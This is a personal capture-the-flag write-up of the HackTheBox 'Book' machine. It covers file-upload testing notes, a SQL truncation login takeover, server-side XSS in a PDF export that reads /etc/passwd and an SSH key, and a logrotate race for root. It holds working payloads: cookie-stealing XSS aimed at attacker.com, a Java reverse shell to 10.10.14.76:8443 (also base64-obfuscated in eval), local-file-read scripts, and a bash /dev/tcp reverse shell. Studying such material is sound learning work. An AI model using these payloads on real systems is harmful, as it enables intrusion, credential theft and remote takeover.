# Book Helped-Thorough

Name: Book
Date:  
Difficulty:  Medium
Goals: 
- Failed to do the `logrotate` section of the Linux Privilege Escalation so has to look up the solution and this was the box that had the same solution
Learnt:
Beyond Root:
- Implement `logrotate` for a home version of Linux and improving my logging setup
- File upload vulnerability improvements
- SQL Truncation Attacks

- [[Book-Notes.md]]
- [[Book-CMD-by-CMDs.md]]

This helped-through was made by reading [ivanitlearning](https://ivanitlearning.wordpress.com/2021/04/17/hackthebox-book/) and following along. Due to it being only about the privilege escalation vector for this box I will put a good 2 hours of practice into hacking the web application
## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![](ping.png)

Looking at port 80 as web site 
![](www-root.png)

Ippsec:
- Recon in the background - `sqlmap`? Still living in OFFSEC mindset of not using SQLmap 
- Can we signup twice to confirm an information disclosure asking whether for...
	- existing accounts by field to enumerate usernames, emails?
	- can we make duplicate usernames, emails?

- Is there HTML entity encoding to prevent XSS? (URL like encoding HTML entities)

The Library as asd
![](loggedinhome.png)

0% CPU is always good... but the checking the source all the php is not available to client side 
![](booksandsource.png)

File uploads the lead to me taking the wrong choice, but it did not matter - learnt alot
![](collections-booksubmissionfileupload.png)

Contact forms...not my strong suit
![](conrtactusmessagesend.png)

Trying a simple test on uploading just encase it was an upload vulnerability
![](testingfileuploadwithinitphpreverseshell.png)

Testing how the username is reflected back to the user:
![](updateprofile.png)

We can pretend to be a user, this is actually closer than the file upload I just did not know SQL truncation exists
![](usertrackingfeatures.png)

Tried forcing a role to no success
![](roleparameter.png)

Sadly no new role
![](nochangetorole.png)

Tried injecting a php web shell into the username field
![](phprceasanameattempt.png)

But we also get another big clue as to what is to come with *size of the text field in SQL* being truncated somehow....
![](phpsystactualresult.png)

Got interested in how downloading is going on
![](collectionssourceanddownloadlink.png)

PDFs why?
![](pdfdownloadingwtf.png)

PDFs is the next clue - but it confused me, I just assumed that we need to use that to parse something at some point, but I had not thought how and was more focused on file uploads as that seemed more possible from my capabilities - hint XSS is not really a part of OSCP level stuff, jkust knowing it exists or you can write XSS into SQL and it is reflected back on the web page and executable where the JavaScript is executed server side not client side..  
![](eachflowerhasacorrespondingpdf.png)

## File Upload Methodology Improvements

These are mirroring my notes as of 28/03/2024; improvements will be added afterwards. I then discovered my Question Based Methodology mind map does not have file upload vulnerabilities covered. https://portswigger.net/web-security/file-upload and BAM:


- File uploads?
	- Are we be diligent in get feedback from our actions with proxying tools?
	- Can we get the source code and read it properly?
	- What languages does the server or connected systems like parsers for xml, JavaScript use?
	- Can we just use `PUT`? 
		- BurpSuite: `Proxy -> Options -> Intercept Client Requests`
	- How does the web servers handle requests for static files?
	- How is the web server handing HTTP Headers see [[HTTP]] 
		- use `curl "http://$IP/page" -X OPTIONS -I`
	- How is the web server handling static files?
		- Executable Or Non-Executable
			- Non-Executable: the server may just send the file's contents to the client in an HTTP response.
			- Executable: server must be configured to executed that file type it will respond to the client
				- Else it is not configured and will respond with an Error
			- Is the file type executable or modifiable to be executable after upload or during?
	- Do we have file execution?
		1. Accessible directory 
		2. Vulnerable parameter with the uploaded file are argument
		3. [[Server-Side-Request-Forgery]] or [[Path-Traversal]] to force execution 
		4. Injection attack to force execution
		5. Download?
	- Where is the filtering occurring client or server side?
		-  Bypassing Client-Side filtering
			1.  Turn off JavaScript in your browser
			2.  Intercept and modify the incoming page
			3.  Intercept and modify the file upload
				1. Change:
					1. Content-Type 
						- [Portswigger](https://portswigger.net/web-security/file-upload) states: *"The `Content-Type` response header may provide clues as to what kind of file the server thinks it has served. If this header hasn't been explicitly set by the application code, it normally contains the result of the file extension/MIME type mapping."*
					1. *filename=*-like-parametres argument to acceptable
			4.  Send the file directly to the upload destination
		- Bypassing Server-Side filtering
			1. Change or embedded the file extension within accepted extension
			2. Change magic number
			3. Change name with encoding or multiples of encoding 
			4. Change the content, length of file
				1. encoding
				2. compression
	- What could be being validated? 
		0. Is the directory where stored writable?
		1. What blacklisting or filtering could be implemented?
			2. Extension validation - only want a .specific extension, can append **after** or **before**
				1. Check for `.phpX` and `.phar` variations for relevant language some have lots
				2. Can be obfuscate file extensions like .aSpx on windows (as windows is case insensitive) be parsed as .aspx
				3. Can we stack file extensions - `exploit.php.jpg`?
					1. With encodings?
						1. URL? Double URL?
						2. multibyte unicode characters:
							- *Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.* [PortSwigger](https://portswigger.net/web-security/file-upload#how-do-web-servers-handle-requests-for-static-files)
					2. With `;` or `%00` - `exploit.asp;.jpg` or `exploit.asp%00.jpg` - because the server process is C/C++ and these being line/string termination characters
			3. File type validation? 
				0. `Content-Type` Header
				1. MIME (Multipurpose Internet Mail Extension) validation 
				2. Magic number validation - first bytes of file, `hexedit` to edit in hex.
			5. File length validation - checks on file length
			6. File name validation - bad chars like control chars, slashes, null bytes
				5. Is the server storing files in a way that is guessable (storing files by naming with an MD5 hash)?
			7. File content validation? 
				- [Wikipedia File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) - Files types have signature set of bytes to make them unique amongst other types
		1. Is the directory were files store user-accessible? 
		1. Is there potentially a race condition?
			1. Is there a custom file validation mechanisms instead of or used in parallel to a framework with temporary/sandboxing destination to which validation checks are performed before storage (hopeful with unguessable file name)?
			2. URL-based file uploads with custom file validation mechanisms
	- Can be bypass File Execution prevention - can we treat the file upload as just *write* not write and be executed by?
		- If there is a file upload vulnerability upload a blank `.htaccess`? 
		- If you can create a new directory on upload make new directory?
		- Is there another page that execute a file that can reach the uploaded file?
			- Is there an File inclusion vulnerability?
		- Do we need to privilege escalated on the web application to execute a file?  
	- Do need top upload malicious client-side scripts like an XSS payload, because we can't have execution over the server? 
	- Is the parser of `.doc` or `.xls` files vulnerable to XXE injection attacks from our uploaded malicious file?

And now I remember why this is a minefield in noting everything that I have tried. 0xDF will guide us there just because time is always a concerning in the rabbitholes of doing everything I need to do....

## SQL Truncation Exploit: 0xDF to the Rescue - BIG TIME

[0xDF](https://0xdf.gitlab.io/2020/07/11/htb-book.html) *Getting a foothold on Book involved identifying and exploiting a few vulnerabilities in a website for a library. First there’s a SQL truncation attack against the login form to gain access as the admin account. Then I’ll use a cross-site scripting (XSS) attack against a PDF export to get file read from the local system. This is interesting because typically I think of XSS as something that I present to another user, but in this case, it’s the PDF generate software. I’ll use this to find a private SSH key and get a shell on the system. To get root, I’ll exploit a regular `logrotate` `cron` using the `logrotten` exploit, which is a timing against against how `logrotate` worked. In Beyond Root, I’ll look at the various `crons` on the box and how they made it work and cleaned up.*

WTF is SQL truncation!?! - SEE Beyond Root:
[Medium - r3d-buck3t: bypass-authentication-with-sql-truncation-attack](https://medium.com/r3d-buck3t/bypass-authentication-with-sql-truncation-attack-25a0c33ab87f)

SQL truncation attack is in how SQL handles input when it is longer than the field it is writing to as when you are creating a text field in an SQL database, you also define the maximum length of the field.

1. Do we fulfil requirements:
	 - Is the site using SQL to store usernames (or equivalents) and passwords?
	 - Can we register a new user? - Web Privilege Escalation 
- Enumerating existing usernames with SQL truncation attacks:
	- Test for existing users:  `SELECT * from users WHERE email = {input_email};`, if 0 rows no email in the database.
- SQL Truncation for Web Privilege Escalation:
	- Send a known account identifier, plus enough spaces to expand beyond the maximum characters, then a non-whitespace character.
		- SQL backend will:
			- Run the first query and return 0 - because it cannot match as field size has been exceeded 
			- Run the second query, but because it’s there is an `INSERT` statement, it truncates the field at the max length (insert the size of your target here). It then removes whitespace from the end, resulting in adding another row that has the duplicate key field.
	- ***If*** the site validates login attempt by searching for `SELECT * from users where username = {user} and password = {password}` and then checks that the number of results is 1, then the malicious duplicate entry will allow login. 
	- [0xDF - HTB SPOILER!](https://0xdf.gitlab.io/2020/07/11/htb-book.html) *"It’s better practice to pull the rows with the matching username, and then make sure there’s exactly one row, and that the passwords match (and of course, also store passwords as hashes and not plaintext)."*

 Incrementally add users till we enumerate the exact size of text field
```php
// + EQUALS whitespace character!!!
name=0xdf&email=admin%40hackthebox.htb+.&password=0xdf
// . is in position 21! It will get dropped and we register as admin user!
name=0xdf&email=admin%40hackthebox.htb++++++.&password=0xdf
```

I failed.
![](sqltruncationattack0xdfisaw3some.png)

![](uptoalotmoreplussigns.png)

![](sqltruncationidiotoverflowtesting.png)
HAHAHAHAHAHAHAHAHAHAHAHAHA
![](allthepluuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuussigns.png)

!['](nospaces.png)

Then I could not log into admin panel...went on a cross referencing spree
- [Ippsec](https://www.youtube.com/watch?v=RBtN5939m3g)
- [[Book.pdf]]

Basically I did not understand that with truncation, we want to ***overwrite*** the email of admin@book.htb, because that account has that role. So from the top:
![](adminfromthetop.png)

![](clientsidejavascripburptotherescue.png)


![](hopefully.png)

Even the legends make the mistakes, boot.htb - Ippsec is awesome.
![](302found.png)

![](moreplusignes.png)


![](adminuserspanel.png)

![](admincolleections.png)

PDF User dumping
![](usersaspdf.png)

![](collectionsdatapdf.png)

## Foothold

[HackTricks - Server Side XSS (Dynamic PDF)](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf) *If a web page is creating a PDF using user controlled input, you can try to **trick the bot** that is creating the PDF into **executing arbitrary JS code**.*

Payloads:
```javascript
<!-- Basic discovery, Write somthing-->
<img src="x" onerror="document.write('test')" />
<script>document.write(JSON.stringify(window.location))</script>
<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>

<!--Basic blind discovery, load a resource-->
<img src="http://attacker.com"/>
<img src=x onerror="location.href='http://attacker.com/?c='+ document.cookie">
<script>new Image().src="http://attacker.com/?c="+encodeURI(document.cookie);</script>
<link rel=attachment href="http://attacker.com">
```

[GitHub - SVG Payloads](https://github.com/allanlw/svg-cheatsheet)

https://github.com/floppywiggler
```javascript
for(var host="10.10.14.76",port=8443,cmd="/bin/sh",p=new java.lang.ProcessBuilder(cmd).redirectErrorStream(!0).start(),s=new java.net.Socket(host,port),pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(),po=p.getOutputStream(),so=s.getOutputStream();!s.isClosed();){for(;pi.available()>0;)so.write(pi.read());for(;pe.available()>0;)so.write(pe.read());for(;si.available()>0;)po.write(si.read());so.flush(),po.flush(),java.lang.Thread.sleep(50);try{p.exitValue();break}catch(e){}}p.destroy(),s.close();
```

Then make it execute - https://www.w3schools.com/jsref/jsref_eval.asp
![](USEevalthen.png)

Make Liveoverflow very sad and use `<script>` tags:
```html
<script>eval(atob(Zm9yKHZhciBob3N0PSIxMC4xMC4xNC43NiIscG9ydD04NDQzLGNtZD0iL2Jpbi9zaCIscD1uZXcgamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyKGNtZCkucmVkaXJlY3RFcnJvclN0cmVhbSghMCkuc3RhcnQoKSxzPW5ldyBqYXZhLm5ldC5Tb2NrZXQoaG9zdCxwb3J0KSxwaT1wLmdldElucHV0U3RyZWFtKCkscGU9cC5nZXRFcnJvclN0cmVhbSgpLHNpPXMuZ2V0SW5wdXRTdHJlYW0oKSxwbz1wLmdldE91dHB1dFN0cmVhbSgpLHNvPXMuZ2V0T3V0cHV0U3RyZWFtKCk7IXMuaXNDbG9zZWQoKTspe2Zvcig7cGkuYXZhaWxhYmxlKCk+MDspc28ud3JpdGUocGkucmVhZCgpKTtmb3IoO3BlLmF2YWlsYWJsZSgpPjA7KXNvLndyaXRlKHBlLnJlYWQoKSk7Zm9yKDtzaS5hdmFpbGFibGUoKT4wOylwby53cml0ZShzaS5yZWFkKCkpO3NvLmZsdXNoKCkscG8uZmx1c2goKSxqYXZhLmxhbmcuVGhyZWFkLnNsZWVwKDUwKTt0cnl7cC5leGl0VmFsdWUoKTticmVha31jYXRjaChlKXt9fXAuZGVzdHJveSgpLHMuY2xvc2UoKTs=))</script>
```

Wanted a libreoffice pdf tool that Ippsec used, he used the site...


First attempt no hands
![](rshell1attempt.png)

And the result:
![](attempt1failed.png)

Scanning around in the video, noticing that Ippsec does alot that I could watch over my lunch...basically we need to read a file and I need to learn more HTML and JavaScript...

```
/home/reader/.ssh/id_rsa
```

```javascript
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

Following alow with 0xDF for this,
![](xssinthenamingnotthefile.png)

```javascript
<script>x=new XMLHttpRequest;x.onload=function(){eval(atob(Zm9yKHZhciBob3N0PSIxMC4xMC4xNC43NiIscG9ydD04NDQzLGNtZD0iL2Jpbi9zaCIscD1uZXcgamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyKGNtZCkucmVkaXJlY3RFcnJvclN0cmVhbSghMCkuc3RhcnQoKSxzPW5ldyBqYXZhLm5ldC5Tb2NrZXQoaG9zdCxwb3J0KSxwaT1wLmdldElucHV0U3RyZWFtKCkscGU9cC5nZXRFcnJvclN0cmVhbSgpLHNpPXMuZ2V0SW5wdXRTdHJlYW0oKSxwbz1wLmdldE91dHB1dFN0cmVhbSgpLHNvPXMuZ2V0T3V0cHV0U3RyZWFtKCk7IXMuaXNDbG9zZWQoKTspe2Zvcig7cGkuYXZhaWxhYmxlKCk+MDspc28ud3JpdGUocGkucmVhZCgpKTtmb3IoO3BlLmF2YWlsYWJsZSgpPjA7KXNvLndyaXRlKHBlLnJlYWQoKSk7Zm9yKDtzaS5hdmFpbGFibGUoKT4wOylwby53cml0ZShzaS5yZWFkKCkpO3NvLmZsdXNoKCkscG8uZmx1c2goKSxqYXZhLmxhbmcuVGhyZWFkLnNsZWVwKDUwKTt0cnl7cC5leGl0VmFsdWUoKTticmVha31jYXRjaChlKXt9fXAuZGVzdHJveSgpLHMuY2xvc2UoKTs=)));x.send();</script>
```

And so demonstrate how I followed allow before
![](testingthershellwith0xdf.png)

![](funnyrshell.png)


```javascript
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
```

![](rsainpdf.png)

![](64timestheamounttoget2046.png)

![](onelongline.png)

![](standupidrsakeyandfoldyourself12times.png)

[unix.stackexchange](https://unix.stackexchange.com/questions/489775/how-to-insert-newline-characters-every-n-chars-into-a-long-string)
![](edgecasessmegdecases.png)
[Bill Joy](https://en.wikipedia.org/wiki/Bill_Joy)
![](blessthismanwhowrotefoldwithMOREJOY.png)
Also wrote `vi` trapping Hackers for decade on Linux!
![](forgetingto-n.png)

Time is an issue PDF2HTML is what ippsec used - I tried this because it is a CTF... https://pdf.io/pdf2html/
![](betterkey.png)

![](questionmarksintheencoding.png)
## Privilege Escalation

![](user.png)

One of the reason I am here is because I guessed this box is vulnerable to a pretty nasty 
[Notselwyn - CVE-2024-1086](https://github.com/Notselwyn/CVE-2024-1086), [pwning.tech/nftables: Flipping Pages: An analysis of a new Linux vulnerability in nf_tables and hardened exploitation techniques](https://pwning.tech/nftables/); 
![3180](flippingtablescve2024-1086-viualexplanation.svg)

Very Naively poking around at the C code

![](whatthehexis.png)

![](morenaivehex.png)

Old day I will hopeful be able to write and exploit kernels like this to be able to have time to have a sense of humour:
![](senseofhumour.png)

[Ubuntu's description CVE-2024-1086](https://ubuntu.com/security/CVE-2024-1086): *A use-after-free vulnerability in the Linux kernel’s netfilter: nf_tables component can be exploited to achieve local privilege escalation. The nft_verdict_init() function allows positive values as drop error within the hook verdict, and hence the nf_hook_slow() function can cause a double free vulnerability when NF_DROP is issued with a drop error which resembles NF_ACCEPT.*

![](soundslikeagreat4months.png)

Simplest condensed Explain to me like I am a child 
- "Memory is RAM", and we can think of all the memory in the RAM as physical grid.
- Memory is similiar to a Bank's book - it has pages we can store information
- Banks can have imaginary money - debts, positions on stock, bonds, etc (information that will give more allow for more money (hopeful))
- We can ask a bank teller to give us some space on a page or a whole page to use (we can write, read or execute stuff on that page) - but...
- There is a employee at the bank called [netfilter](https://www.netfilter.org/) who sits on the phone to register actions about how the internal/external phone call work - these phone call that are read off the Bank's page of memory
- Because netfilter allows for us you swear at netfilter page by:
- we can create action to tell filter to write swear words even though the error says we swore it keeps reading the swear words, and because it keeps reading we can free memory up on his page (which is privilege page, like Jeff's, but now we are impersonating the netfilter) execute a phone call to boss of the bank to call him swear words, because we can write on his special table on his section of the Banks page, by then free space on the table to put our own instructions on the table 

Unfortunately this did not work....

- https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges
- https://github.com/whotwagner/logrotten

```
https://github.com/whotwagner/logrotten
gcc -o logrotten logrotten.c
```

rev_shell.sh
```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.76/8443 0>&1 
```

```bash
gcc -o logrotten logrotten.c 

echo 0xdf >> /home/reader/backups/access.log; ./logrotten /home/reader/backups/access.log rev_shell.sh 
```

![](root.png)
## Post-Root-Reflection  

- And all of this to do a section of the HTB academy and the road there was full of new things!
- I need to do more boxes with new ways
## Beyond Root

- Scripting a sed script in a for loop of tokens, that modifies nth times 


WTF is SQL truncation!?!:
[Medium - r3d-buck3t: bypass-authentication-with-sql-truncation-attack](https://medium.com/r3d-buck3t/bypass-authentication-with-sql-truncation-attack-25a0c33ab87f)

Read this https://pwning.tech/nftables/
1. Read the overview section (check if the content is even interesting to you)
2. Split-screen this blogpost (reading and looking up)
3. Skip to the bug section (try to understand how the bug works)
4. Skip to the proof of concept section (walk through the exploit)
5. If things are not clear, utilize the background and/or techniques section.

- https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html